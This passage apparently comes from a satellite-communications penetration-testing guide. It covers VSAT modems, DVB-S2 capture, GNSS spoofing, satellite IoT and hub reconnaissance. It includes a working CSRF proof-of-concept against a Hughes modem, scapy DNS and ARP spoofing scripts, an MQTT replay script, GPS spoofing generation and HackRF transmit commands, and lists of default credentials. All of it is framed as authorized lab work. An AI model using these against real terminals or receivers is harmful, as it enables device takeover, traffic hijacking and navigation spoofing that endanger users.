
In 2017, a CSRF vulnerability was documented in the HughesNet HT1100/HT1000 residential modem web UI. An attacker on the LAN could trigger administrative actions (DNS change, password change) via a crafted HTTP request from a victim browser. This is a representative class of vulnerability in satellite residential modems.

```bash
# Test (authorized lab with an HT1100): trigger a DNS change via CSRF
# Host the PoC on a lab web server
cat > csrf_dns.html <<HTML
<form action="http://192.168.0.1/dns_config.cgi" method="POST" id="f">
  <input name="dns1" value="10.0.0.53">
  <input name="dns2" value="10.0.0.53">
</form>
<script>f.submit()</script>
HTML
python3 -m http.server 8080 &
# Verify in the HT1100 logs that the DNS was changed (or rejected by CSRF protection)
```

### 4.9 Viasat Home / Business Modem Pentest

```bash
# Authorize engagement: enumerate the Viasat SurfBeam2 web UI
nmap -sV -p 80,443,8080,23 192.168.0.1
# Inspect the web UI for default credentials
curl -s http://192.168.0.1/ | grep -i 'login\|password'
# Document the firmware version
curl -s http://192.168.0.1/about.html | grep -i 'firmware\|version'
# Test for CSRF on administrative endpoints (in lab)
```

### 4.10 Apache Chukwa Fleet Monitoring Breach (historical reference)

The Apache Chukwa project (a data-collection system for Hadoop) was historically used by some operators to aggregate fleet telemetry from satellite terminals. A 2014 vulnerability in Chukwa's HTTP collector allowed unauthenticated log injection — an attacker could inject fabricated terminal telemetry into the fleet monitoring. This is a reference class: the fleet monitoring plane is itself an attack surface.

---

## 5. DVB-S/S2/S2X (and DVB-RCS, DVB-SH)

DVB-S (ETSI EN 300 421, 1994) is the original QPSK satellite TV standard. DVB-S2 (EN 302 307, 2005) added 8PSK, 16APSK, 32APSK, adaptive coding and modulation (ACM), and LDPC + BCH FEC. DVB-S2X (EN 302 307-2, 2014) extended the modulation with 64APSK, 128APSK, 256APSK and smaller roll-offs for higher throughput. DVB-RCS (EN 301 790) is the return-channel standard for two-way VSAT; DVB-RCS2 (ETSI TS 101 545) adds security (mutual authentication, AES link encryption). DVB-SH is the mobile satellite TV standard (around 2.2 GHz S-band).

### 5.1 leandvb — Software DVB-S2 Demodulator

```bash
# Install leandvb (and its dependencies: libVOLK, libfec)
sudo apt install libvolk2-dev libfec-dev
git clone https://github.com/pabr/perfect-vines.git
cd perfect-vines
make
# Verify
./leandvb --help 2>&1 | head
```

### 5.2 DVB-S2 Capture with RTL-SDR

```bash
# Capture a DVB-S2 carrier (use a Ku-band LNB with PLL LO at 9750/10600 MHz)
# Connect LNB via bias-tee to RTL-SDR V3
# Example: Astra 19.2°E, transponder at 11.474 GHz vertical
# Downconverted IF: 11474 - 10600 = 874 MHz — but RTL-SDR works better > 1 GHz
# Use a different transponder: 11.052 GHz H -> 452 MHz IF (below RTL min)
# Better: 11.727 GHz V -> 1127 MHz IF
rtl_sdr -f 1127000000 -s 2400000 -g 40 -n 240000000 dvbs2_capture.iq
# This captures 100 seconds at 2.4 Msps (note: DVB-S2 symbol rate is typically 27.5 Msym/s;
# the RTL-SDR can't capture the full carrier at 27.5 Msym/s — use a BladeRF xA4 or AirSpy RDS instead)
# For lab teaching: capture a narrower-band carrier (e.g., 1 Msym/s)
```

### 5.3 Demodulate DVB-S2 with leandvb

```bash
# Demodulate with leandvb
./leandvb --sr 27500000 --roll-off 0.35 --vit 27500 --in dvbs2_capture.iq --out dvbs2.ts 2> leandvb.log
# Inspect the recovered TS
dvbsnoop -n 20 dvbs2.ts | head -30
# Count TS packets
ts2sec dvbs2.ts 2>&1 | head
```

### 5.4 DVB-S2 Symbol Rate Scan (Blind Scan)

```bash
# Use leandvb's blind scan mode to find carriers in a captured band
./leandvb --blindscan --in scan.iq 2> blind.log
# Or use a dedicated blind-scan tool (e.g., CrazyScan for Windows)
# Linux equivalent: scan_dvbs2.py (community)
python3 scan_dvbs2.py --input scan.iq --start-freq 950M --stop-freq 2150M
```

### 5.5 DVB-CSA Descrambling (Authorized Lab Only)

DVB-CSA (Common Scrambling Algorithm, ETSI TS 100 289) uses a 48-bit control word to scramble each TS packet. The control word is delivered via Entitlement Control Messages (ECM) every 2–10 seconds, encrypted with the operator's service key. In an authorized lab with a CA card, descrambling is straightforward.

```bash
# Authorized lab: extract ECMs from the TS
dvbsnoop -n 0 -tssnoop dvbs2.ts 2>&1 | grep -A 5 'ECM' | head
# Use a DVB-CSA descrambler (e.g., libdvbcsa)
# Note: this requires a CA card from the conditional-access provider
# Outside an authorized lab, this is illegal (DMCA § 1201, EU CDir Art. 6)
```

### 5.6 DVB-RCS2 Mutual Authentication

DVB-RCS2 (ETSI TS 101 545-2) defines a security layer with:
- TLS-style handshake between the terminal and the hub
- Mutual authentication (terminal cert + hub cert)
- AES-CCM link encryption (per-packet authentication)
- Key refresh on a defined cadence

Older DVB-RCS (v1) terminals often had no link-layer encryption — a documented weakness.

### 5.7 DVB-S HBBTV Attack Surface

HBBTV (Hybrid Broadcast Broadband TV, ETSI TS 102 796) is a standard for interactive TV apps delivered via DVB-S plus a broadband return path. HBBTV apps run in a browser-like sandbox on the TV; historically, the sandbox has had security flaws (XSS, CSP bypass). This is a niche attack surface but documented in research.

### 5.8 welle.io — DVB GUI Receiver

```bash
# Install welle.io
sudo apt install welle.io
# Connect an RTL-SDR; welle.io supports DVB-T (terrestrial) by default
# For DVB-S2 capture, use the "Expert Mode" to feed an IQ file
welle-io --input dvbs2_capture.iq &
```

### 5.9 DVB MPE Decapsulation

```bash
# Extract IP packets from a DVB-S2 TS carrying MPE-encapsulated traffic
tshark -r dvbs2.ts -Y 'dvb.mpe' -V 2>&1 | head -50
# Or use dvbsnoop's MPE dissector
dvbsnoop -s ts -n 1000 dvbs2.ts 2>&1 | grep -A 3 'MPE' | head -20
```

### 5.10 DIRECTV / Dish Network Reference

DIRECTV and Dish Network are the major US DTH (Direct-To-Home) satellite TV providers. They use DVB-S/S2 modulation with proprietary conditional access (DIRECTV VideoGuard / NDS, Dish Echostar/DISH Network CA). Penetration testing of these systems requires engagement with the operator — out of scope for typical engagements.

### 5.11 DVB-RCS Hub Recon (authorized)

```bash
# Authorized hub engagement: enumerate the hub's forward link
tshark -i eth1 -Y 'dvb.s2_bbframe' -V 2>&1 | head -50
# Identify the TIM (Terminal Information Message) table
tshark -i eth1 -Y 'dvb.rcs_tim' -V 2>&1 | head -30
# Document the per-terminal bandwidth allocation
```

---

## 6. VSAT — iDirect, Hughes, Newtec, Comtech

VSAT (Very Small Aperture Terminal) networks are point-to-multipoint satellite networks used by retailers (Walmart, Sears), gas stations (ExxonMobil), banks (remote ATMs), maritime (shipping), and SCADA (pipelines, wind turbines). The hub is the central earth station; remote terminals are 1.2m Ku-band or 74cm Ka-band antennas at customer sites.

### 6.1 iDirect 9500/9800 Modem Shell Access

iDirect modems (9500, 9800, Evolution series) run VxWorks with a debug shell accessible via telnet/SSH after engineering password recovery. The shell exposes the modem's full configuration, the inroute/outroute frequencies, and the NMS registration state.

```bash
# Authorized engagement: telnet to the iDirect modem
telnet 192.168.1.1
# Default login prompt: "login:"
# Engineering password recovery (documented procedure):
#   - Reboot modem with serial console connected
#   - Interrupt boot at the VxWorks boot prompt
#   - Reset the password via boot script
# Once in the shell (iDirect vVxWorks debug shell):
#   -> iDirectShow
#   -> printRfConfig
#   -> printNetworkConfig
# Document the inroute/outroute frequency, symbol rate, and NMS IP
```

### 6.2 Hughes HM/HT Modem Attach

Hughes HM (HN7000S class) and HT (HT1000/HT1100 class) modems have a hidden debug menu accessible via CSRF-protected forms on the web UI. The debug menu exposes modem diagnostics, RF stats, and (in early firmware) a shell-like interface.

```bash
# Authorized engagement: enumerate the Hughes web UI
curl -s http://192.168.0.1/ | grep -i 'version\|model'
# Hidden URLs (may vary by firmware):
curl -s http://192.168.0.1/cgi/index.cgi | head
curl -s http://192.168.0.1/cgi/status.cgi | head
curl -s http://192.168.0.1/cgi/diagnostics.cgi | head
# Test for CSRF on administrative endpoints
curl -s -X POST http://192.168.0.1/cgi/admin_reset.cgi
```

### 6.3 DNS Hijack on VSAT Uplink (authorized lab)

```bash
# Authorized hub-side lab: inject a spoofed DNS response on the uplink
# (Requires hub cooperation — the hub forwards the spoofed response to remotes)
# Use scapy to craft the spoofed DNS response
python3 -c "
from scapy.all import *
spoofed = Ether()/IP(src='8.8.8.8', dst='192.168.1.10')/UDP(sport=53, dport=33333)/DNS(
    qr=1, ancount=1,
    an=DNSRR(rrname='example.com', type='A', rdata='10.0.0.53', ttl=300)
)
sendp(spoofed, iface='eth1')
print('Spoofed DNS response sent')
"
# Verify on a remote terminal that the spoofed response was received (or rejected)
tcpdump -i eth0 -n 'port 53' on_remote_terminal &
```

### 6.4 iDirect Evolution NMS Recon

```bash
# Authorized hub engagement: enumerate the iDirect NMS
nmap -sV -p 80,443,5775,5780 10.0.0.0/24
# The NMS exposes:
#   - Port 80/443: web admin
#   - Port 5775: NMS protocol (iDirect custom)
#   - Port 5780: SOAP API (configuration)
# Document the NMS version
curl -sk https://10.0.0.10/nms/version | head
```

### 6.5 iDirect HOPPING Plans (inroute frequency hopping)

iDirect uses inroute frequency hopping to mitigate rain fade and interference. Each remote terminal is assigned a hopping plan (a sequence of inroute frequencies); the hub tells each remote which frequency to use at each timeslot. The hopping plan is provisioned by the NMS.

```bash
# From an authorized iDirect modem shell, inspect the hopping plan
# -> printHoppingPlan
# Output example:
#   Plan 12: slots 1-10 freq=14.015GHz, slots 11-20 freq=14.025GHz, ...
# Document the hopping plan as evidence
```

### 6.6 Newtec / Comtech Modem Recon

```bash
# Newtec MDM2500 / MDM6000 modems
nmap -sV -p 23,80,443,161 192.168.1.0/24
# Newtec web UI is typically on 80/443 with default creds admin/admin
# Comtech CDM-570L / CDM-625
# Comtech modems expose a serial console by default; telnet on port 23 after enable
snmpwalk -v2c -c public 192.168.1.10 system | head
```

### 6.7 VSAT Uplink Authorization Check

```text
VSAT terminal license fields (US FCC):
  - Call sign (e.g., E990123)
  - Frequency (inroute, e.g., 14.015 GHz)
  - Polarization (LHCP / RHCP)
  - EIRP (max, e.g., 47 dBW)
  - Orbital slot (e.g., 91°W Galaxy-17)
  - Symbol rate (e.g., 256 ksym/s)
These fields must match the engagement scope.
```

### 6.8 Hub-Side Uplink Filtering (defense verification)

```bash
# Authorized hub engagement: test uplink filtering
# Inject various L2/L3 attacks on the uplink and verify the hub drops them:
#   - ARP spoofing
#   - DHCP rogue server
#   - DNS hijack
#   - ICMP redirect
python3 -c "
from scapy.all import *
# ARP spoof attempt
sendp(Ether()/ARP(op=2, psrc='192.168.1.1', pdst='192.168.1.10'), iface='eth1')
print('ARP spoof attempt sent (hub should drop)')
"
tcpdump -i eth0 -n 'arp' on_remote &
```

### 6.9 VSAT Terminal Provisioning Protocol Abuse

```bash
# Authorized engagement: examine the provisioning protocol
# iDirect uses an in-band management VLAN (typically VLAN 100) for NMS traffic
tcpdump -i eth1 -w provisioning.pcap 'vlan 100' &
# Inspect the captured provisioning traffic
tshark -r provisioning.pcap -V 2>&1 | head -50
# Document: is the provisioning traffic encrypted? authenticated?
```

### 6.10 Maritime VSAT — Sailor / Intellian / JRC

```bash
# Sailor 800 VSAT terminal (common on merchant ships)
nmap -sV -p 23,80,443 192.168.0.0/24
# Default creds: admin/admin (document; recommend rotation)
# Intellian v100 / v110 terminals
# Web UI on 192.168.1.1, default admin/1234
# Document the ACU (Antenna Control Unit) and BUC/PLL versions
```

---

## 7. GNSS Receiver Attacks

GNSS (Global Navigation Satellite System) attacks are receiver-side — the satellite cannot be touched. The attack class is spoofing: broadcasting a counterfeit signal that overrides the authentic one, causing the receiver to compute a wrong position and/or time.

### 7.1 GPS L1 C/A Signal Structure

```text
GPS L1 C/A at 1575.42 MHz:
  - Civilian signal, BPSK modulated at 1.023 Mcps
  - Spread-spectrum processing gain ~43 dB (1 ms integration)
  - Navigation message at 50 bps (12.5 min for full almanac)
  - Per-satellite PRN code (Gold code, 32 codes)
  - Minimum receivable power: ~-130 dBm at earth's surface
  - Transmitted power: ~50 W per satellite EIRP (very weak by the time it arrives)
```

### 7.2 GPS-SDR-SIM — Spoofing Signal Generator

```bash
# Install GPS-SDR-SIM (lab / Faraday cage only)
sudo apt install gcc
git clone https://github.com/osqzsun/GPS-SDR-SIM.git
cd GPS-SDR-SIM
make -j4
# Verify
./gps-sdr-sim --help
```

### 7.3 Download RINEX Ephemeris

```bash
# Download today's broadcast ephemeris from NASA CDDIS
# (Daily BRDC file: brdcDDD0.YYn.gz where DDD=day-of-year, YY=year)
DOY=$(date +%j)
YEAR=$(date +%y)
wget -q -O brdc.gz "ftp://gdc.cddis.eosdis.nasa.gov/gnss/data/daily/20${YEAR}/brdc/brdc${DOY}0.${YEAR}n.gz"
gunzip brdc.gz
mv brdc brdc${DOY}0.${YEAR}n
ls -la brdc*.${YEAR}n
```

### 7.4 Generate Spoofed IQ Signal

```bash
# Generate a 60-second IQ for a spoofed position (lat=51.5, lon=-0.12, alt=50m — London)
./gps-sdr-sim -e brdc${DOY}0.${YEAR}n -l 5051.4794,N,00000.0000,E,50 -d 60 -b 16
# Output: gpssim.bin (16-bit IQ at 2.6 Msps, ~624 MB)
# Verify
ls -la gpssim.bin
file gpssim.bin
```

### 7.5 Transmit via HackRF (Faraday Cage Only)

```bash
# LAB / FARADAY CAGE ONLY — broadcasting GPS L1 is illegal outside a cage
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R
# -R: repeat the file (for continuous spoofing during a long test)
# -x 20: TX VGA gain 20 dB (start low; increase only if needed inside the cage)
# Verify the target receiver's reported position shifts to London
# Place a known-good GPS receiver inside the cage as control
```

### 7.6 Galileo E1 Spoofing (reference)

Galileo E1 at 1575.42 MHz (same center frequency as GPS L1) uses CBOC (Composite Binary Offset Carrier) modulation. Spoofing Galileo requires generating a CBOC signal — not all open-source SDR transmitters support this.

```bash
# Reference: gnss-sdr can transmit Galileo E1 (lab only)
# Install gnss-sdr
sudo apt install gnss-sdr
# Configure a Galileo E1 spoofing scenario (advanced; beyond basic lab scope)
# Verify the receiver's reported position shifts
```

### 7.7 Multi-Constellation Cross-Check (defense)

A receiver that tracks GPS + Galileo + GLONASS + BeiDou is harder to spoof: the attacker must spoof all four constellations consistently. Document the receiver's multi-constellation capability.

```bash
# Verify the receiver's multi-constellation tracking
# (e.g., u-blox Z9-F9P, Septentrio PolaRx5)
# Connect via serial/USB; query the receiver's status
screen /dev/ttyACM0 9600
# u-blox UBX-CFG-GNSS message shows which constellations are enabled
```

### 7.8 RAIM / RAIM+ Spoofing Detection

RAIM (Receiver Autonomous Integrity Monitoring) uses the redundancy of >5 satellites to detect a single bad signal. RAIM+ (with FDE — Fault Detection and Exclusion) can identify and exclude the bad signal. Spoofing attacks that affect all satellites uniformly defeat RAIM.

```bash
# Verify RAIM status on the target receiver
# u-blox UBX-NAV-RAIM message (newer firmware)
# Or query via the NMEA $GPGST or $PUBX sentences
screen /dev/ttyACM0 9600
# Look for: $GPGST,hhmmss.ss,... (position error statistics)
# Document: does the receiver flag the spoofed signal?
```

### 7.9 ADS-B / AIS Correlation

For aviation and maritime receivers, ADS-B and AIS can be cross-checked against the GPS position. A spoofed GPS position that does not match the ADS-B/AIS-derived position is an anomaly.

```bash
# Capture ADS-B (1090 MHz) and compare to GPS
# Use dump1090 or readsb
dump1090 --net --interactive &
# Capture AIS (161.975 / 162.025 MHz) and compare to GPS
# Use rtl-ais
rtl_ais -g 40 -l 161.975M -r 162.025M &
```

### 7.10 Inertial Navigation Cross-Check

For aircraft and ships, the inertial navigation system (INS) provides a dead-reckoned position that should match the GPS position within a bounded error. A GPS spoofing attack causes a growing divergence between INS and GPS — a strong anomaly indicator.

### 7.11 Time Spoofing

GPS-disciplined oscillators (GPSDOs) use GPS to discipline a local oscillator. Spoofing the GPS signal can cause the GPSDO to drift, affecting any system that depends on accurate time (telecom sync, financial trading, SCADA timestamps).

```bash
# Verify the GPSDO's reported time vs. a known-good NTP source
ntpq -p
# Compare the GPSDO's 1PPS output to a cesium/rubidium reference
# Document any drift during a spoofing test (lab)
```

---

## 8. Other Constellations

### 8.1 OneWeb

OneWeb (acquired by the UK government and Bharti, 2020) is a LEO broadband constellation at 1200 km altitude, Ku-band user link (10.7–12.7 GHz down) and Ka-band gateway link. As of 2024, 648 satellites are in orbit providing enterprise/government services. The user terminal is a flat-panel phased array (integrated antenna + modem). Penetration testing of OneWeb terminals requires engagement with OneWeb or an authorized reseller.

### 8.2 Kuiper (Amazon)

Kuiper is Amazon's LEO constellation (planned 3,236 satellites). As of 2024, prototype satellites are in orbit; commercial service is targeted for 2025. The user terminal is a flat-panel phased array designed by Amazon's Lab126. Penetration testing will require engagement with Amazon once commercial terminals are deployed.

### 8.3 Telesat Lightspeed

Telesat Lightspeed is a planned Canadian LEO constellation (198 satellites) for enterprise/government customers. Ka-band user link. Targeted for service in 2027.

### 8.4 Globalstar

Globalstar is a LEO narrowband constellation at 1400 km altitude, providing voice and low-rate data over L-band (2483.5–2500 MHz downlink) and S-band (1610–1626.5 MHz uplink). Used by Apple's Emergency SOS (iPhone 14+) for satellite messaging. Globalstar satellites are "bent pipe" (no crosslinks), requiring a ground station within the same footprint.

```bash
# Globalstar downlink at 2491 MHz — receivable with an S-band antenna + SDR
hackrf_transfer -r globalstar.iq -f 2491000000 -s 2000000 -g 40 -a 1 -d 60
# Demodulation requires custom flowgraph (not packaged)
```

### 8.5 Swarm (SpaceX subsidiary)

Swarm is a low-data-rate IoT satellite service (SpaceX subsidiary since 2021). Satellites at ~550 km altitude, VHF/UHF frequencies. Used for asset tracking and remote sensor telemetry. The Swarm Tile is the user modem (small, low-power). Penetration testing requires engagement with Swarm.

### 8.6 Astrocast, Kineis, Lacuna Space

These are LEO narrowband IoT constellations operating in VHF/UHF and L-band:
- Astrocast: L-band, 64 satellites planned
- Kineis: VHF/UHF, 25 satellites, IoT messaging
- Lacuna Space: UHF, low-power IoT sensor connectivity

```bash
# Lacuna Space uses LoRa modulation at UHF (~150-160 MHz)
# Receive with an RTL-SDR and a LoRa demodulator
rtl_sdr -f 150000000 -s 250000 -g 40 -n 25000000 lacuna.iq
python3 lora_demod.py lacuna.iq
```

---

## 9. Hub / Gateway Side (Lab only)

### 9.1 Hub Earth Station Recon (authorized)

```bash
# Authorized hub engagement: identify hub components
nmap -sV -p 80,443,161,5775,5780 10.0.0.0/24 -oG hub_scan.txt
# Typical hub components:
#   - Hub modem (iDirect Hub, Hughes Hub, Newtec Hub)
#   - NMS server (Network Management System)
#   - DNS / DHCP / RADIUS servers
#   - RF monitoring equipment
snmpwalk -v2c -c private 10.0.0.10 system | head
```

### 9.2 NMS Web UI Recon

```bash
curl -sk https://10.0.0.10/ | head
curl -sk https://10.0.0.10/login | grep -i 'version\|model'
# Document default credentials (often admin/admin or admin/password)
```

### 9.3 NMS API Recon

```bash
# iDirect NMS SOAP API (port 5780)
curl -sk 'https://10.0.0.10:5780/api/terminals' | head
# Hughes NMS REST API (port 8080)
curl -sk 'http://10.0.0.10:8080/api/terminals' | head
```

### 9.4 Gateway Earth Station Physical Security (reference)

```text
Gateway physical security checklist:
  - Perimeter fence and access control
  - RF-shielded equipment room (Faraday cage for spares)
  - Redundant power (UPS + generator)
  - Dual diverse uplinks (in case of fiber cut)
  - Antenna de-ice system (for snow/ice regions)
  - Lightning protection
```

---

## 10. Wireshark / PCAP Dissection

### 10.1 DVB-S/S2 Dissection

```bash
# Decode a DVB-S2 TS capture
tshark -r dvbs2.ts -Y 'dvb_s2_bbframe' -V 2>&1 | head -50
# Decode MPE-encapsulated IP
tshark -r dvbs2.ts -Y 'dvb_mpe' -V 2>&1 | head -50
# Decode GSE-encapsulated IP
tshark -r dvbs2.ts -Y 'gse' -V 2>&1 | head -50
```

### 10.2 GNSS Dissection

```bash
# Decode GPS L1 C/A navigation messages
tshark -r gnss.pcap -Y 'gps' -V 2>&1 | head -50
# Decode Galileo E1
tshark -r gnss.pcap -Y 'galileo' -V 2>&1 | head -50
```

### 10.3 Iridium / Inmarsat Dissection

```bash
# Wireshark does not have built-in dissectors for Iridium or Inmarsat L-band bursts
# Use a custom Lua dissector
wireshark -r iridium.pcap -X 'lua_script:iridium.lua' &
```

### 10.4 DVB-RCS Dissection

```bash
tshark -r dvb_rcs.pcap -Y 'dvb_rcs' -V 2>&1 | head -50
tshark -r dvb_rcs.pcap -Y 'dvb_rcs_tim' -V 2>&1 | head -30
```

### 10.5 VSAT NMS Dissection

```bash
# iDirect NMS protocol on port 5775
tshark -r vsat_nms.pcap -Y 'tcp.port==5775' -V 2>&1 | head -50
# Hughes DVB-RCS NMS
tshark -r vsat_nms.pcap -Y 'dvb_rcs' -V 2>&1 | head -30
```

---

## 11. Reporting / Evidence

### 11.1 Frequency Evidence

```bash
# Document the engagement frequency environment
rtl_power -f 950M:2150M:0.5M -g 40 -i 60s -e 1h ku_band_scan.csv &
rtl_power -f 1500M:1660M:0.1M -g 40 -i 60s -e 1h l_band_scan.csv &
# Generate a spectrogram
heatmap.py ku_band_scan.csv ku_band.png
heatmap.py l_band_scan.csv l_band.png
```

### 11.2 Capture Evidence

```bash
# Hash and timestamp every capture
for f in *.iq *.pcap; do
    sha256sum "$f" >> captures.sha256
    stat -c '%n %y' "$f" >> captures.timestamps
done
```

### 11.3 Terminal Discovery Evidence

```bash
nmap -sV -p 23,80,443,554,5775,5780,8080 192.168.0.0/24 -oA terminal_scan
# Document each discovered terminal:
#   - IP / MAC
#   - Open ports
#   - Banner / version
#   - Default credentials (if tested)
```

### 11.4 Firmware Evidence

```bash
# Document every firmware extraction
sha256sum extracted_firmware.bin >> firmware.sha256
binwalk extracted_firmware.bin > firmware.binwalk.txt
strings -n 8 extracted_firmware.bin > firmware.strings.txt
# Verify the firmware matches the operator's published version
```

---

## 12. Quick Reference Cheat Sheet

```text
# === STARLINK ===
# Dishy gRPC enumeration
grpcurl -plaintext -import-path . -proto device.proto 192.168.100.1:9200 list
grpcurl -plaintext -import-path . -proto device.proto -d '{"get_status":{}}' \
  192.168.100.1:9200 SpaceX.API.Device.Device/Handle | python3 -m json.tool

# === IRIDIUM ===
# Capture + decode L-band bursts
hackrf_transfer -r iridium.iq -f 1621250000 -s 2000000 -g 40 -a 1 -d 60
gr_iridium -r 2000000 iridium.iq -o iridium_out

# === INMARSAT ===
# L-band capture at 1525-1559 MHz
rtl_sdr -f 1545000000 -s 1024000 -g 40 -n 10240000 inmarsat.iq

# === VIASAT KA-SAT ===
# SurfBeam2 firmware extraction (lab)
sudo flashrom -p ch341a_spi -r surfbeam2_flash.bin
binwalk -e surfbeam2_flash.bin

# === DVB-S2 ===
# Capture + demodulate
rtl_sdr -f 1127000000 -s 2400000 -g 40 -n 240000000 dvbs2.iq
leandvb --sr 27500000 --roll-off 0.35 --vit 27500 --in dvbs2.iq --out dvbs2.ts

# === VSAT (iDirect / Hughes) ===
# Modem shell (authorized)
telnet 192.168.1.1
# -> iDirectShow
# -> printRfConfig

# === GNSS SPOOFING (LAB ONLY) ===
./gps-sdr-sim -e brdc.n -l 40,-75,100 -d 60 -b 16
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R

# === CONSTELLATION TRACKING ===
gpredict &
wget -O ~/.config/Gpredict/tle/starlink.txt \
  'https://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle'
```

### Frequency Quick Reference

```text
BAND    DOWNLINK (GHz)    UPLINK (GHz)      USE
L       1.5–1.6           1.6–1.7           Inmarsat, Iridium (mobile)
S       1.9–2.5           2.1–2.7           Globalstar, DVB-SH
C       3.4–4.2           5.9–6.4           Asia (satellite TV)
X       7.2–7.9           7.9–8.4           Military / government
Ku      10.7–12.75        14.0–14.5         DVB-S/S2, VSAT, Starlink (user)
Ka      17.7–21.2         27.0–31.0        Viasat, Hughes Jupiter, Starlink (gateway)
V       37.5–42.5         47.2–50.2        Future HTS
GNSS    1.2, 1.5, 1.6     N/A               GPS, Galileo, GLONASS, BeiDou
```

### Modulation Quick Reference

```text
STANDARD    MODULATION           SYMBOL RATE      FEC
DVB-S       QPSK                 1–45 Msym/s      1/2 to 7/8 (Viterbi+RS)
DVB-S2      QPSK/8PSK/16/32APSK  1–60 Msym/s      1/4 to 9/10 (LDPC+BCH)
DVB-S2X     + 64/128/256APSK     1–60 Msym/s      2/9 to 13/45 (LDPC+BCH)
Iridium     BDPSK / QPSK         25 ksym/s        Convolutional
Inmarsat    QPSK                 varies           Convolutional
GPS L1 C/A  BPSK                 1.023 Mcps       (spread spectrum)
Galileo E1  CBOC                 1.023 Mcps       (spread spectrum)
```

### Critical Commands by Phase

```text
PHASE 1 - RECON:
  gpredict &                                         # track passes
  rtl_power -f 950M:2150M:0.5M -i 5s ku_band.csv &  # frequency survey
  nmap -sV -p 23,80,443,5775 192.168.0.0/24          # terminal discovery

PHASE 2 - CAPTURE:
  hackrf_transfer -r iridium.iq -f 1621.25M -s 2M -g 40 -d 60
  rtl_sdr -f 1127M -s 2.4M -g 40 -n 240M dvbs2.iq

PHASE 3 - DECODE:
  gr_iridium -r 2000000 iridium.iq -o out
  leandvb --sr 27500000 --in dvbs2.iq --out dvbs2.ts

PHASE 4 - PROTOCOL:
  grpcurl -plaintext -import-path . -proto device.proto 192.168.100.1:9200 ...
  tshark -r dvbs2.ts -Y 'dvb_mpe' -V

PHASE 5 - REPORT:
  sha256sum *.iq *.pcap > captures.sha256
  heatmap.py ku_band.csv ku_band.png
```

---

## 13. Satellite IoT (Swarm, Astrocast, Kineis, Lacuna)

Satellite IoT constellations provide low-data-rate (bytes per minute to a few kbps) connectivity for asset tracking, agriculture, environmental sensors, and remote SCADA. They operate in VHF (137 MHz), UHF (400 MHz), and L-band (1.5 GHz) allocations. Their attack surface is narrower than broadband constellations but their low-power nature makes spoofing/jamming easier.

### 13.1 Swarm (SpaceX Subsidiary)

Swarm operates ~150 satellites at ~550 km altitude, providing VHF data services. The user terminal is the Swarm Tile (small, low-power, ~1 W). Swarm is now a SpaceX subsidiary and integrated into the Starlink business.

```bash
# Receive Swarm VHF downlink (lab)
# Swarm uses VHF (~137-138 MHz) Earth Exploration Satellite Service (EESS) allocation
rtl_sdr -f 137500000 -s 250000 -g 40 -n 25000000 swarm_capture.iq
# Demodulate (custom flowgraph — Swarm uses GMSK)
gnuradio-companion swarm_demod.grc &
```

### 13.2 Astrocast

Astrocast operates L-band (1.5 GHz) with ~20 satellites (planned 64). The user terminal is a small low-power modem for asset tracking.

```bash
# Astrocast L-band capture
hackrf_transfer -r astrocast.iq -f 1500000000 -s 250000 -g 40 -a 1 -d 60
# Demodulation requires custom flowgraph
```

### 13.3 Kineis

Kineis operates VHF/UHF with 25 satellites (planned). Kineis uses the legacy Argos frequency allocation (137–138 MHz) for low-power IoT.

```bash
# Kineis / Argos VHF capture
rtl_sdr -f 137500000 -s 125000 -g 40 -n 12500000 kineis_capture.iq
# Argos uses DPSK at 4.8 kbps
# Decode with a custom DPSK demodulator
```

### 13.4 Lacuna Space

Lacuna Space uses UHF (~150–160 MHz) with LoRa modulation for low-power IoT sensor connectivity. Lacuna's space segment is essentially a LoRa gateway in orbit.

```bash
# Lacuna / LoRa capture at UHF
rtl_sdr -f 150000000 -s 250000 -g 40 -n 25000000 lacuna_capture.iq
# Demodulate with a LoRa demodulator (Python)
pip3 install --user lora-demod
python3 -m lora_demod --input lacuna_capture.iq --freq 150000000 --bw 125000 --sf 7
```

### 13.5 Satellite IoT Security Posture

```text
Common security gaps in satellite IoT:
  - No link-layer encryption (relies on application-layer AES)
  - No mutual authentication (sensor -> satellite is one-way)
  - Replayable messages (no nonce / timestamp)
  - Shared network key across all sensors in a fleet
  - Weak cryptographic primitives (CRC instead of HMAC)

Recommended posture:
  - Per-device X.509 certificates for mutual auth
  - AES-GCM with random IV for confidentiality + integrity
  - Replay protection via timestamp + nonce
  - Per-device session keys derived via ECDH
```

### 13.6 Satellite IoT Pen Test Scope

```bash
# Authorized engagement against a satellite IoT sensor fleet
# 1. Identify the satellite IoT gateway on the LAN
nmap -sV -p 1883,8883,5683,5684 192.168.1.0/24
# Typical ports:
#   1883  MQTT (plaintext)
#   8883  MQTTS (TLS)
#   5683  CoAP
#   5684  CoAPS (DTLS)
# 2. Inspect MQTT traffic (authorized)
mosquitto_sub -h 192.168.1.10 -t 'sensors/#' -v | head -20
# 3. Check for replay vulnerability
# Capture a sensor reading, modify timestamp, replay
python3 -c "
import paho.mqtt.client as mqtt
client = mqtt.Client()
client.connect('192.168.1.10', 1883)
# Replay a captured reading with modified timestamp
client.publish('sensors/temp/001', '{\\"ts\\":9999999999,\\"value\\":42.5}')
"
```

---

## 14. 5G NTN (Non-Terrestrial Networks) Integration

3GPP Release 17 (2022) introduced NTN (Non-Terrestrial Networks) integration, allowing satellites to act as 5G RAN nodes. Two NTN variants exist:
- **NR-NTN** (New Radio NTN) — 5G NR adapted for satellite (LEO/GEO) propagation delay
- **IoT-NTN** — NB-IoT and eMTC adapted for satellite

NTN terminals are dual-mode (terrestrial 5G + satellite 5G). The attack surface is the union of the 5G and satellite attack surfaces.

### 14.1 NTN Frequency Allocations

```text
NR-NTN FR1 (below 6 GHz, FDD):
  - n255: 1525–1559 MHz down, 1626.5–1660.5 MHz up (L-band, Inmarsat)
  - n256: 1930–1970 MHz down, 1990–2020 MHz up (S-band)

NR-NTN FR2 (above 24 GHz, TDD):
  - Ka-band allocations for HTS

IoT-NTN:
  - L-band (Inmarsat)
  - B1 (BeiDou 1559–1563 MHz)
```

### 14.2 NTN Lab Setup

```bash
# Authorized lab: bring up a 5G NTN testbed
# Use Open5GS as the 5G Core
# Use a software NTN gNB (e.g., Amarisoft NTN option)
# Simulate LEO propagation delay (e.g., 30 ms one-way for 550 km altitude)
# Verify NTN-specific NAS messages:
